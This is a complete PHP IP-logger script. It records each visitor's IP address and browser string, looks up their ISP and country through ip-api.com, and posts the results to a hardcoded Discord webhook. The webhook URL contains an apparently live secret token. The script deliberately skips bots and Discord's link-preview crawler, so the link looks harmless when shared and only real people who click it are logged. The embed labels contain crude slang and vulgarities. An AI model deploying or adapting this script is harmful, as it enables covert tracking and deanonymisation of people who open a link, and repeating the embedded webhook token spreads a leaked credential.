<?php

$Webhook    = "https://discord.com/api/webhooks/943140639263055942/UcmIIfU7iLFBV4ZnXd70WBflkOBMD_HCOy0lhjWFexu2KLkmedeSwgO5aaw3p_K8_Rlc";
$WebhookTag = "xmandzio";
$WebhookAvatar = "https://pbs.twimg.com/profile_images/1470093142489808901/54i2fWw5_400x400.jpg";
$DEmbedColor = "FF5733";

$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];

if(preg_match('/bot|Discord|robot|curl|spider|crawler|Cloudflare-SSLDetector|^$/i', $Browser)) {
    exit();
}

$Curl = curl_init("http://ip-api.com/json/$IP");
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl));
curl_close($Curl);

$ISP = $Info->isp;
$Status = $Info->status;
$Country = $Info->country;
$timestamp = date("Y-m-d H:i:s");


$hookObject = json_encode([ 
    'username'   => "$WebhookTag" , 
    'avatar_url' => "$WebhookAvatar",
    "embeds" => [
       
        [
            "title" => "Logged",
            
            
            "type" => "rich",
            
            
            "timestamp" => "$timestamp",
            
            
            "color" => hexdec( "$DEmbedColor" ),
            
            
            "footer" => [
                "text" => "ojeb mi rure",
            ],
            "thumbnail" => [
                "url" => "https://cdn.kurwa.club/files/oCd4b.png"
            ],
            
            "author" => [
                "name" => "sex",
                "url" => "https://sex.com/"
            ],
            
            "fields" => [
              
                [
                    "name" => "ajpi",
                    "value" => "$IP",
                    "inline" => true
                ],
                [
                    "name" => "rodzaj vectry",
                    "value" => "$ISP",
                    "inline" => true
                ],
                [
                    "name" => "femboy?",
                    "value" => "$Status",
                    "inline" => true
                ],
                [
                    "name" => "bowser",
                    "value" => "$Browser",
                    "inline" => false
                ],
                [
                    "name" => "contry",
                    "value" => "$Country",
                    "inline" => true
                ],
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $Webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );
?>